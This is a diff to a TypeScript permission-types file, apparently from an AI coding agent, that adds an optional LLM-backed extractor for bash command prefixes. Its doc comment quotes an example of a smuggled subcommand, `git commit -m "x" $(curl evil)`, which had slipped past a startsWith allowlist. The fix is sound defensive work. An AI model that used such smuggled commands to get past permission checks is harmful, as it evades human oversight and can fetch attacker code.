@@ -2,6 +2,8 @@
  * Permission Types
  */
 
+import type { BashPrefixExtractor } from '@kodax-ai/coding';
+
 // ============== Permission Mode ==============
 
 /**
@@ -189,6 +191,20 @@ export interface PermissionContext {
   saveAlwaysAllowTool?: (tool: string, input: Record<string, unknown>, allowAll?: boolean) => void;
   switchPermissionMode?: (mode: PermissionMode) => void;
   beforeToolExecute?: (tool: string, input: Record<string, unknown>) => Promise<boolean | string>;
+  /**
+   * FEATURE_153 (v0.7.38) — Optional LLM-backed bash command prefix extractor.
+   * When supplied, `isToolCallAllowed` uses it to extract the SAFE PREFIX of
+   * a bash command before matching against allowlist patterns like
+   * `Bash(git commit:*)`. This eliminates the pre-FEATURE_153 vulnerability
+   * where `git commit -m "x" $(curl evil)` matched the allowlist via naive
+   * `command.startsWith` semantics.
+   *
+   * KodaX REPL bootstrap creates this via `createBashPrefixExtractor` from
+   * `@kodax-ai/coding` and threads it here. SDK consumers / tests without
+   * LLM access can omit it; legacy startsWith semantics apply (documented
+   * as insecure in `matchesBashPatternLegacy`).
+   */
+  bashPrefixExtractor?: BashPrefixExtractor;
 }
 
 /**
